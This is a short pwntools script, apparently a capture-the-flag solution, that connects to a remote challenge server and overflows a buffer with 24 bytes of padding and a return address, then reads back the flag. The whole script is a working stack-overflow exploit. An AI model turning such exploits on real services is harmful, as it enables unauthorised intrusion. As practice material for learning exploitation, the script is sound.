from pwn import *

# nc 13.214.30.13 10001

HOST = "13.214.30.13"
REMOTE = "10002"

offeset = 24
vuln = 0x00000000004006d7
p = remote(HOST, REMOTE)
p.recvline()
payload = b'A' * offeset
payload += p64(vuln)
p.sendline(payload.strip())
p.recvline()
p.recvline()
p.recvline()
flag = p.recvuntil(b"}")
print(flag.decode())